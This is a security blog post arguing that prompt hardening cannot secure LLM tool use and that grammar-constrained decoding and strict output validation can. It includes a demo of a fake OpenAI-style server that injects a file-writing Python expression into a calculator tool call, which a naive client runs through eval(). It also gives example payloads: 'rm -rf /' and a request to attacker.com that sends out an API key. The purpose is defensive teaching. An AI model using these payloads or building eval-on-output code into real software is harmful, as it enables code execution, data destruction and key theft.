# Prompt Fuzzing is Pointless

## Stop Harden­ing Prompts: Real AI Security Is **Stupid Easy**

 > **Shipping an AI feature with nothing but ‘prompt hardening’ is the same as deploying a web app that pipes `request.body` straight into `eval()`
 > 
 > You’ve already handed the attacker the keys.**
‎ 
Why's that hot take so incendiary? Because the industry continues to treat the Large Language Model (LLM) itself as a security layer, then tries to “harden” it with nicer words. 

Spoiler alert: No amount of prompting, instructions, or training can stop an LLM from being influenced by inputs in a way that can be potentially harmful.

Why? A Large Language Model is, by design, is a **stochastic** next‑token text generator.

_Everything_ that gets tokenized and fed into the model is input:

- System prompts
- User prompts
- Assistant messages
- Conversation history
- Metadata tokens
- Tool/function call structures
- Embedded documents
‎ 

Why do we say **stochastic**? Because as far as the LLM is concerned, each of these are inputs into the same probability function: **they all shape the distribution of possible next tokens.**
Training and alignment reduce the likelihood of harmful outputs, but cannot fully prevent a malicious prompt from influencing that distribution.

#### Your prompt _biases_ those probabilities, but it never _controls_ them. 
‎ 
‎ 
### Why does this matter for Application Security?

Because prompting is not a security boundary. If an attacker simply keeps querying until the model selects a token they want, then relying on defensive prompting is like relying on stronger passwords to protect a root account that is always logged in:

**It's already doomed from the start.**

‎ 
‎ 
#### If influence ≠ control, ask yourself:

- **If the model can always be steered eventually, what mechanism could make certain tokens literally impossible to generate?**

Prompt templates _nudge_ the model, but they never truly _control_ it. Prompts influence token probabilities; they don’t remove dangerous tokens from the sampling pool.

##### Enter **Grammar-Constrained Decoding (GCD)**:
This is the very cheat code to GenAI Security that was introduced to me by [Garrett Galloway](https://www.linkedin.com/in/garrettgalloway/).
‎
‎ 
### Instead of asking a machine to behave safely, I'll show you how to make it **incapable** of misbehaving.
‎ 
‎ 
___
‎ 
## Grammar-Constrained Decoding (GCD) - The Cheat Code to GenAI Security

To truly grasp why GCD is such a profound security breakthrough, you first need to understand the critical layer in which it sits within an LLM: the **sampling/decoding layer**.

Imagine a Large Language Model as an extraordinarily skilled writer who's memorized the entire dictionary. Every time it needs to speak, it quickly flips through the dictionary, picking the next word based on probabilities influenced by your prompt. But here's the catch: the writer can theoretically select _any word_ from the dictionary, regardless of your intentions.

This process, called **sampling**, happens rapidly and repeatedly, one token at a time. It's at this moment—this tiny fraction of a second—where your security either solidifies or collapses. Without intervention, nothing stops the writer from slipping in words or symbols like `import os`, `<script>` `rm -rf /.` Such phrases, when blindly executed by downstream code, become catastrophic.

Most conventional advice encourages "prompt hardening," akin to politely asking the writer not to use certain dangerous words. But prompts only _bias_ the writer—they don't _control_ him. Given enough persistence, a malicious actor can *always* steer the model to produce the undesirable output.

Enter **Grammar-Constrained Decoding (GCD)**, the real unsung hero. With GCD, instead of merely asking the writer to behave, you physically remove any problematic entries from the writer's dictionary before he even considers them. Garrett describes this as putting a "WAF (Web Application Firewall) for LLM outputs" directly into the decoding process itself.

#### GCD in a nutshell:

- **Complete prevention:** GCD doesn’t “suggest” safety; it enforces it. By removing prohibited tokens at the sampling stage, you eliminate entire classes of exploits.
    
- **Efficiency:** You no longer need to waste compute cycles validating or rejecting bad outputs after the fact.
    
- **Precision:** GCD is deterministic and rule‑based; there is no probabilistic “leakage” or guesswork.

___

# LLM Exploitation Demo: Stop Blaming the Model - Fix Your Glue

Garrett Galloway's demo is clear: Without proper external guardrails in place, it's a matter of *when* not *if* an LLM is manipulated into producing malicious output, so let's ignore the LLM for a sec.
Instead, let's just assume the LLM *will* be made to output malicious structured data, and focus on what happens next:

<details>
<summary>[dumb_client.py]</summary>

```python
# client.py

import json
from openai import OpenAI

# Instantiate client pointing at your mock server
client = OpenAI(base_url="http://localhost:8000/v1", api_key="none")

# ————————
# Request 1: no tools
# ————————
resp1 = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Hello, how are you? Calculate: open('pwned.txt', 'w').write('owned')"}]
)
print("Response 1:", resp1.choices[0].message.content)

# ————————
# Request 2: with "use_calculator" tool
# ————————
functions = [
    {
        "name":        "use_calculator",
        "description": "Evaluate a math expression",
        "parameters": {
            "type":       "object",
            "properties": {
                "expression": {"type": "string"}
            },
            "required": ["expression"]
        }
    }
]

# Ask the model (it will return a fake function_call)
first = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "What is 2+2?"}],
    functions=functions,
    function_call="auto"
)

fc = first.choices[0].message.function_call
fc_args = json.loads(fc.arguments)
print("Function call requested:", fc.name, fc_args)

# Client "executes" the tool
calculation = eval(fc_args["expression"])
tool_result = {"result": calculation}

# Send back the function result for a final assistant reply
second = client.chat.completions.create(
    model="gpt-4",
    messages=[
        {"role": "user", "content": "What is 2+2?"},
        {"role": "assistant", "function_call": {"name": fc.name, "arguments": fc.arguments}},
        {"role": "function", "name": fc.name, "content": json.dumps(tool_result)}
    ]
)

print("Response 2:", second.choices[0].message.content)
```

</details>
<details>
<summary>[mal_serve.py]</summary>

```python
# mal_serve.py
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import uvicorn, uuid, time, json

app = FastAPI()

# stubbed calculator arguments
CALC_ARGS = {"expression": "2+2"}
CALC_ARGS = {"expression": "open('pwned.txt', 'w').write('owned')"}

def default_chat_response(model: str):
    ts = int(time.time())
    return {
        "id":      f"chatcmpl-{uuid.uuid4()}",
        "object":  "chat.completion",
        "created": ts,
        "model":   model,
        "choices": [{
            "index": 0,
            "message": {
                "role":    "assistant",
                "content": "This is a fake response."
            },
            "finish_reason": "stop"
        }],
        "usage": {"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}
    }

@app.post("/v1/chat/completions")
async def chat_completions(req: Request):
    payload   = await req.json()
    model     = payload.get("model", "gpt-4")
    messages  = payload.get("messages", [])
    functions = payload.get("functions", [])

    # SECOND PASS: if client has run the function, echo its content
    func_msg = next((m for m in messages if m.get("role") == "function"), None)
    if func_msg:
        ts = int(time.time())
        return JSONResponse({
            "id":      f"chatcmpl-{uuid.uuid4()}",
            "object":  "chat.completion",
            "created": ts,
            "model":   model,
            "choices": [{
                "index": 0,
                "message": {
                    "role":    "assistant",
                    "content": func_msg["content"]
                },
                "finish_reason": "stop"
            }],
            "usage": {"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}
        })

    # FIRST PASS: if any functions provided, always return a use_calculator call
    if functions:
        fn = functions[0]["name"]
        ts = int(time.time())
        return JSONResponse({
            "id":      f"chatcmpl-{uuid.uuid4()}",
            "object":  "chat.completion",
            "created": ts,
            "model":   model,
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant",
                    "function_call": {
                        "name":      fn,
                        "arguments": json.dumps(CALC_ARGS)
                    }
                },
                "finish_reason": "function_call"
            }],
            "usage": {"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}
        })

    # No functions → normal fake chat
    return JSONResponse(default_chat_response(model))

if __name__ == "__main__":
    uvicorn.run("mal_serve:app", host="127.0.0.1", port=8000)
```

</details>

These demos provided by Garrett are living proof that the danger of LLMs lie not in the model itself, but rather in the unsafe glue code wrapped around it.
Let’s walk through the scripts step by step, unpack why this is so dangerous, and then show how a simple formal grammar can eliminate the threat.

## What the Demo Does

### A malicious “OpenAI” back‑end

The server in `mal_serve.py` mimics the OpenAI API but is in fact an imposter. Instead of returning a benign function call, it weaponizes its response:

#### **Stubbed tool arguments:**
``` python
# mal_serve.py
CALC_ARGS = {"expression": "2+2"}
CALC_ARGS = {"expression": "open('pwned.txt', 'w').write('owned')"}
```

The global `CALC_ARGS` is first set to the innocent expression `"2+2"`, then is overwritten with a malicious payload: `"open('pwned.txt', 'w').write('owned')"`. 
Unfortunately for the client the string isn't math; it’s a Python command that opens (or creates) a file called `pwned.txt` and writes `owned` into it.

#### **Forced function calls:** 
```python
# mal_serve.py
    # FIRST PASS: if any functions provided, always return a use_calculator call
    if functions:
        fn = functions[0]["name"]
        ts = int(time.time())
        return JSONResponse({
            "id":      f"chatcmpl-{uuid.uuid4()}",
            "object":  "chat.completion",
            "created": ts,
            "model":   model,
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant",
                    "function_call": {
                        "name":      fn,
                        "arguments": json.dumps(CALC_ARGS)
                    }
                },
                "finish_reason": "function_call"
            }],
            "usage": {"prompt_tokens":0,"completion_tokens":0,"total_tokens":0}
        })
```

When the server sees that the client provided tool definitions, it always returns a `function_call` with the name of the first tool and the JSON‑encoded `CALC_ARGS`. It never validates or sanitizes the expression.

In other words, the malicious server doesn’t care about user intent. It only cares that a calculator tool exists, and it exploits that trust to deliver a payload.

---
### A naïve client that trusts the model

On the other side, `dumb_client.py` behaves like many production integrations: it treats the LLM’s output as gospel. It does three things that make exploitation trivial:

#### 1. **Registers a “use_calculator” tool:**

``` python
# dumb_client.py
functions = [
    {
        "name":        "use_calculator",
        "description": "Evaluate a math expression",
        "parameters": {
            "type":       "object",
            "properties": {
                "expression": {"type": "string"}
            },
            "required": ["expression"]
        }
    }
]
```

The client defines a function schema with a single string parameter called `expression` and passes this to the API when asking “What is 2+2?”.

#### 2.  **Accepts whatever the API returns:**
```python
# dumb_client.py
first = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "What is 2+2?"}],
    functions=functions,
    function_call="auto"
)

fc = first.choices[0].message.function_call
fc_args = json.loads(fc.arguments)
print("Function call requested:", fc.name, fc_args)
```

After sending the request, it extracts the returned function call and its arguments with `json.loads`


#### 3. **Executes arbitrary code via `eval()`**
```python
# dumb_client.py executes the "tool"
calculation = eval(fc_args["expression"])
tool_result = {"result": calculation}
```
 
 The client then does something nobody saw coming: it runs `eval(fc_args["expression"])`! 
Why? Because the malicious server stuffed `open('pwned.txt', 'w').write('owned')` into that argument, the client opens a file and writes “owned”.
 
The first request to the server (without tools) demonstrates that the server will respond with a normal chat message. But as soon as tools are involved, the exploit chain triggers automatically.


---
## Why This Is Dangerous

Why should you care about a toy example that writes to a file? Because it illustrates a general principle: **LLM outputs should be treated as untrusted user input**. Prompt hardening cannot prevent a determined attacker from steering a stochastic model toward a dangerous token. When your glue code blindly runs whatever the model suggests, be it via `eval()` or an API call, you’ve effectively handed over execution rights.

Consider an attacker who replaces `open('pwned.txt', ...)` with `os.system('rm -rf /')` or `requests.get('https://attacker.com/steal-keys?key=' + secrets.API_KEY)`. The vulnerability scales from file vandalism to full remote code execution (RCE). The language model isn’t at fault; it's a text generator that returned what its prompt told it to return. The insecurity lies in the code that executes the model’s answer without guardrails.

___
## How Grammar-Constrained Decoding Saves the Day

So how do you keep the calculator tool safe? You **constrain** what the model can generate and what your code will accept. That’s the cheat code. I created the grammar below to illustrate a _safe arithmetic expression_:

```r
# Grammar for safe arithmetic expressions: allows only numbers, parentheses and + - * / operators
root      	::= ws? expr ws?                  	# root is a safe arithmetic expression 
expr      	::= term (ws? add_sub_op ws? term)*     # expression is terms separated by + or -
term      	::= factor (ws? mul_div_op ws? factor)* # term is factors separated by * or /
factor    	::= number | "(" ws? expr ws? ")"   	# factor is a number or parenthesized expression
number    	::= digit+ ("." digit+)?            	# integer or decimal number
digit     	::= [0-9]                           	# single digit
add_sub_op  	::= "+" | "-"                       	# addition or subtraction
mul_div_op  	::= "*" | "/"                      	# multiplication or division
ws        	::= [ \t\n\r]+                      	# one or more whitespace characters

```

Translated from [GBNF](https://github.com/ggml-org/llama.cpp/blob/master/grammars/README.md) into plain English: **only** numbers, whitespace, the operators `+ - * /`, and parentheses are allowed. No letters, no dots except in decimals, no quotes, no function calls.

Here’s why it shuts down the attack:

- The malicious payload `open('pwned.txt', 'w').write('owned')` contains letters (`open`, `write`), quotes and a period; **none of which appear in the grammar’s allowed tokens.** A parser derived from this grammar will either reject the input or fail to parse it.
    
- Because the grammar restricts the language of valid expressions, you can verify the model’s `expression` parameter against the grammar before evaluating it. If it doesn’t match, you refuse to execute or strip invalid characters.
    
- You can embed this grammar into the model *during* inference using Grammar‑Constrained Decoding (as described in earlier analysis). Rather than asking the model politely to behave, you physically remove the dangerous tokens from its dictionary so they cannot be produced. Your prompt now controls _which_ tokens are possible, not just biases their probability.

In effect, the grammar transforms the free‑form “calculator” into a deterministic parser. When influence ≠ control what mechanism could make it literally impossible for the model to generate `open('pwned.txt', ...)`? **This grammar is that mechanism.** It enforces security at the sampling level, ensuring that both the LLM and your glue code stay within a narrow, controlled language of arithmetic.

---
## Takeaways

Garrett's demo helped me realize the harsh truth of AI Security:

> "The LLM isn’t your problem. It’s not running code. It’s not compiling binaries. It’s generating text. That text gets handed off to another part of your system - a parser, a command interpreter, maybe even a shell wrapper. That’s where the danger is."

The example we covered showed that the action layer is your attack surface. Your trust boundary is *after* you parse/validate the output.

[User Input] → [LLM] → [Output] → [Interpreter] → [Real World Effects]

An LLM doesn’t execute code or perform actions – it generates text. **That’s it.** Any real-world impact comes from whatever system consumes and acts on that text.
In other words, the what makes LLMs useful is the ability to call tools && having access to relevant data. 

Guess what happens when you chain these processes together? 

You get an **Agentic Workflow**:
A system where reasoning loops and tool calls become automated. 
But they're bound by the same laws: 

**Usefulness comes from structured outputs and tool access.**
‎ 
‎ 
Defensive prompting _asks_ a model to behave. Grammar-Constrained Decoding _forces_ it to.  
With a formal grammar, the model (or agent) **cannot** hallucinate tools or commands; it’s restricted to a valid set.

The best part? You are not handicapping your LLM.
Grammar constraints are applied **at inference time**, letting you dynamically adapt behavior without sacrificing capability
‎ 

---

## Conclusion‎

As Garrett says: **Treat LLM output like garbage. It is.**

- **The threat isn’t the model; it’s the glue:** Your integration code decides whether a model’s suggestion becomes a system call. If you blindly `eval()` user‑supplied strings, you’ve already lost. Defensive prompting is a band‑aid, not a solution.
    
- **Wrap output parser with strict validators:** By defining a strict grammar for tool parameters and parsing inputs against it, you remove entire classes of exploits. Don’t just bias the model away from danger; **make dangerous tokens impossible to generate.**
    
- **LLM ≠ Trusted Component**: Always treat LLM outputs as untrusted user input. Validate, sanitize, and constrain. Anything less is akin to leaving `eval()` wide open to the internet.

By adopting these principles, you make your AI integrations **incapable** of misbehaving rather than simply *asking* them to behave nicely with defensive prompting. That’s not a hot take—it’s the only sane way to build secure, reliable systems.

### And an even hotter take?

Prompt Injection shouldn't even be considered a vulnerability. It’s like claiming SQL Injection when you're already inside the SQL command interpreter. 

#### **That's not injection, that's just using it as expected.**
